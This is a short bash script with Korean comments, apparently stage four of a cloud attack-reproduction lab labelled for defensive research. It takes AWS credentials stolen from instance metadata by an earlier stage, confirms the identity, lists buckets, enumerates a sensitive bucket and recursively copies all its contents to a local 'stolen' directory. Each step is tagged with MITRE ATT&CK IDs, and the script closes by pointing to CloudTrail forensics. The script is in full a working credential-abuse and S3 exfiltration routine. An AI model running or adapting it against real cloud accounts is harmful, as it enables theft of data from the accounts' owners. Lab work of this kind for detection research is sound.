#!/bin/bash
# 4단계: 탈취 키로 오프박스 정찰 + S3 유출 (T1078.004, T1580, T1619, T1530)
# 범위: 본인 소유 격리 재현 환경 전용(방어 연구 목적).
# 사전: 03_imds.sh로 임시 자격증명 확보 후 'source stolen/creds.env' 로 적용.
# 공격자 워크스테이션(오프박스)에서 aws-cli로 실행 -> CloudTrail에 외부 IP/aws-cli UA로 남는다.
set -euo pipefail

: "${AWS_ACCESS_KEY_ID:?먼저 'source stolen/creds.env' 로 탈취 자격증명을 적용하세요.}"

echo "[*] 신원 확인 (T1078.004)"
aws sts get-caller-identity
echo

echo "[*] 버킷 열거 (T1580)"
aws s3 ls
echo

BUCKET=$(terraform -chdir=../terraform output -raw sensitive_bucket 2>/dev/null || true)
if [ -z "${BUCKET:-}" ]; then
  read -r -p "민감 버킷 이름을 입력하세요: " BUCKET
fi

echo "[*] 대상 버킷 나열: $BUCKET"
aws s3 ls "s3://$BUCKET/" --recursive
echo

echo "[*] 데이터 유출 (T1530) -> ./stolen/"
mkdir -p stolen
aws s3 cp "s3://$BUCKET/" ./stolen/ --recursive

echo "[+] 유출 완료. 유출 시각(UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[i] CloudTrail에서 sourceIPAddress(공격자 IP) / userAgent(aws-cli) 확인 -> 분석 단계"
